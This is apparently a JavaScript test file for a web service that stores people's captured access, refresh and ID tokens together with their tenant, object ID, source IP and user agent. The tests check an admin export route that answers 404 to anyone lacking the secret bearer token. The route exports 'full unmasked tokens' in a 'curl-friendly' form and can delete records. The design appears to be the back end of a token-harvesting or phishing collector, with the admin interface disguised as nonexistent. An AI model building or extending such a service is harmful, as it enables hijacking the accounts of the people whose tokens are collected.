const test = require('node:test');
const assert = require('node:assert/strict');
const request = require('supertest');

const { buildApp } = require('../app');
const { memoryStore, testConfig, silentLogger, TEST_ADMIN_TOKEN } = require('./_helpers');

const AUTH_HEADER = `Bearer ${TEST_ADMIN_TOKEN}`;

async function seedOne(store, suffix = '1') {
  await store.upsertToken({
    upn: `alice-${suffix}@example.com`,
    oid: `oid-${suffix}`,
    tenantId: `tid-${suffix}`,
    displayName: `Alice ${suffix}`,
    accessToken: `access-${suffix}-aaaaaa`,
    refreshToken: `refresh-${suffix}-bbbbbb`,
    idToken: 'id-token',
    scope: 'User.Read',
    expiresAt: Math.floor(Date.now() / 1000) + 3600,
    sourceIp: '127.0.0.1',
    userAgent: 'test',
  });
  return `tid-${suffix}:oid-${suffix}`;
}

test('GET /admin/export without bearer returns 404', async () => {
  const store = memoryStore();
  await seedOne(store);
  const app = buildApp({ config: testConfig(), store, logger: silentLogger() });
  const res = await request(app).get('/admin/export');
  assert.equal(res.status, 404);
});

test('GET /admin/export with valid Bearer returns full JSON array', async () => {
  const store = memoryStore();
  await seedOne(store, '1');
  await seedOne(store, '2');
  const app = buildApp({ config: testConfig(), store, logger: silentLogger() });
  const res = await request(app).get('/admin/export').set('Authorization', AUTH_HEADER);
  assert.equal(res.status, 200);
  assert.match(res.headers['content-type'] || '', /application\/json/);
  const body = JSON.parse(res.text);
  assert.ok(Array.isArray(body));
  assert.equal(body.length, 2);
  const upns = body.map((r) => r.upn).sort();
  assert.deepEqual(upns, ['alice-1@example.com', 'alice-2@example.com']);
  // full unmasked tokens — curl-friendly
  const row = body.find((r) => r.upn === 'alice-1@example.com');
  assert.equal(row.accessToken, 'access-1-aaaaaa');
  assert.equal(row.refreshToken, 'refresh-1-bbbbbb');
});

test('GET /admin/export with wrong token returns 404', async () => {
  const store = memoryStore();
  const app = buildApp({ config: testConfig(), store, logger: silentLogger() });
  const res = await request(app)
    .get('/admin/export')
    .set('Authorization', 'Bearer wrong');
  assert.equal(res.status, 404);
});

test('GET /admin (no /export) is 404 — no HTML dashboard exists', async () => {
  const store = memoryStore();
  await seedOne(store);
  const app = buildApp({ config: testConfig(), store, logger: silentLogger() });
  const res = await request(app).get('/admin').set('Authorization', AUTH_HEADER);
  assert.equal(res.status, 404);
});

test('GET /admin/export/:id returns full JSON blob', async () => {
  const store = memoryStore();
  const id = await seedOne(store);
  const app = buildApp({ config: testConfig(), store, logger: silentLogger() });
  const res = await request(app)
    .get(`/admin/export/${encodeURIComponent(id)}`)
    .set('Authorization', AUTH_HEADER);
  assert.equal(res.status, 200);
  assert.match(res.headers['content-type'] || '', /application\/json/);
  const body = JSON.parse(res.text);
  assert.equal(body.accessToken, 'access-1-aaaaaa');
  assert.equal(body.refreshToken, 'refresh-1-bbbbbb');
  assert.equal(body.scope, 'User.Read');
  assert.equal(typeof body.expiresAt, 'number');
});

test('GET /admin/export/:id for unknown id returns 404 JSON', async () => {
  const store = memoryStore();
  const app = buildApp({ config: testConfig(), store, logger: silentLogger() });
  const res = await request(app)
    .get('/admin/export/tid-x:oid-x')
    .set('Authorization', AUTH_HEADER);
  assert.equal(res.status, 404);
  assert.match(res.headers['content-type'] || '', /application\/json/);
});

test('POST /admin/delete/:id returns JSON {ok:true} (no redirect)', async () => {
  const store = memoryStore();
  const id = await seedOne(store);
  const app = buildApp({ config: testConfig(), store, logger: silentLogger() });
  const res = await request(app)
    .post(`/admin/delete/${encodeURIComponent(id)}`)
    .set('Authorization', AUTH_HEADER);
  assert.equal(res.status, 200);
  assert.match(res.headers['content-type'] || '', /application\/json/);
  const body = JSON.parse(res.text);
  assert.equal(body.ok, true);
  assert.equal(body.id, id);
  assert.equal(await store.getToken(id), null);
});
